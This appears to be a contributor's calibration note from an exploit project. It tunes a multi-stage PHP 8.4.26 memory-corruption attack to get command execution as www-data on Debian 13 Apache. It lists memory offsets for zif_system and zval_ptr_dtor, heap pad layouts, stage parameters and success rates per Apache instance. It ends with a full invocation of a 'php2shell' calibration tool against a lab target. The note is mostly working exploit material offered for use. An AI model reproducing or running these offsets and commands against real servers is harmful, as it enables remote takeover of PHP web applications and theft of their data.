# PHP 8.4.26 Debian 13 / apxs2 calibration

Status: **contributor-reported, not independently confirmed** by the
maintainer as of 2026-10-30.

## Environment

- PHP 8.4.26 built from source with `--with-apxs2`
- Debian 13, Apache 2.4.69 prefork, one worker
- `display_errors=On`, `memory_limit=8M`, `session.upload_progress=On`
- OOM body: `memory_limit + 12M`

## Reported results

- Stages 1-2 dispatch cleanly on every attempt with the profile offsets
  (`zif_system=0x3b19a0`, `zval_ptr_dtor=0x584f00`, `htdata=0x6e0d8`).
- Stage 3 uses the third layout measured on this build: five `(4,4)` pads plus
  six `(31,31)` pads, `stage3_fake_len=31`, `stage3_fakes=12`,
  `stage3_b_name_len=3`, `stage3_wfields=5`, `stage3_cookie=true`.
- `uid=33(www-data)` proof: 4/4 runs on one Apache master instance; 0/5+ on
  other masters started the same way. This is instance-dependent, like the
  8.4.25 probabilistic profile; restart/rotate and retry.
- The proof command runs inside the Apache mount namespace (`PrivateTmp`), so
  the reported read-back uses `nsenter -t <pid> -m -- cat /tmp/p9b`.

## Reproducing

```sh
python3 tools/php2shell_calibrate.py \
  --target http://127.0.0.1:<lab>/index.php \
  --container <apache-container> \
  --stage1-n 892 --stage1-len 79 --stage2-t 442 \
  --stage3-htdata 0x6e0d8 --stage3-pads '4:4x5,31:31x6' \
  --stage3-carrier lab --stage3-attempts 5 \
  --distro deb13 --arch amd64 --proof-file /out/p1
```

The generated profile must select `upstream_profile: lab` and
`stage3_carrier: false`; otherwise the dispatcher takes the carrier branch and
will not reproduce this layout. Because two 8.4.26/amd64 profiles exist, run
the dispatcher with `--profile deb13-apxs2`.
